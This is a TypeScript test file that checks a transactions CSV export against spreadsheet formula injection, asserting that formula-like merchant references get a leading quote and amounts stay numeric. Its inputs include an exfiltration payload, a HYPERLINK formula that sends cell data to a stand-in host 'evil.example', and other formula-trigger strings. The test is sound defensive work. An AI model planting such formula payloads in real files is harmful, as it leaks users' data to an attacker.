/**
 * B8: CSV formula injection. A merchant reference that starts with = + - @
 * (or tab / CR) runs as a formula when finance opens the export in Excel.
 * Text cells must be neutralised with a leading single quote (OWASP);
 * amount columns must stay plain numbers. Requires DATABASE_URL.
 */
import assert from "node:assert/strict";
import { randomUUID } from "node:crypto";
import { after, test } from "node:test";
import { Pool } from "pg";
import { buildTransactionsExportCsv } from "./exportCsv.js";

const databaseUrl = process.env.DATABASE_URL;
if (!databaseUrl) throw new Error("exportCsvInjection.fix.test.ts requires DATABASE_URL");
const pool = new Pool({ connectionString: databaseUrl, max: 2 });
after(async () => {
  await pool.end();
});

test("B8: formula-like references are prefixed with a quote; amounts and normal references are unchanged", async () => {
  const m = await pool.query<{ id: string }>(
    `INSERT INTO merchants (display_name, mdr_bps) VALUES ($1, 250) RETURNING id`,
    [`CSV Injection ${randomUUID()}`],
  );
  const merchantId = m.rows[0]!.id;
  const references = [
    '=HYPERLINK("http://evil.example/?x="&A1,"Click")',
    "+1+2",
    "-2+3",
    "@SUM(A1:A9)",
    "\tcmd",
    "\rcmd",
    "order-42",
  ];
  for (let i = 0; i < references.length; i++) {
    await pool.query(
      `INSERT INTO transactions (merchant_id, status, amount_fils, captured_fils, reference, acquirer_reference, occurred_at)
       VALUES ($1, 'captured', 12345, 12345, $2, $3, $4)`,
      [merchantId, references[i], `acq_${randomUUID()}`, new Date(Date.UTC(2026, 3, 1, 10, i))],
    );
  }

  const csv = await buildTransactionsExportCsv(pool, { merchantId });
  assert.ok(csv.includes(`"'=HYPERLINK(""http://evil.example/?x=""&A1,""Click"")"`), csv);
  assert.ok(csv.includes(",'+1+2,"), csv);
  assert.ok(csv.includes(",'-2+3,"), csv);
  assert.ok(csv.includes(",'@SUM(A1:A9),"), csv);
  assert.ok(csv.includes(",'\tcmd,"), csv);
  assert.ok(csv.includes(`,"'\rcmd",`), csv);
  assert.ok(csv.includes(",order-42,"), csv);
  // Amount columns stay numbers: no quote prefix.
  for (const line of csv.split("\n").slice(1)) {
    assert.match(line, /^[0-9a-f-]{36},captured,12\.345,12\.345,/);
  }
});
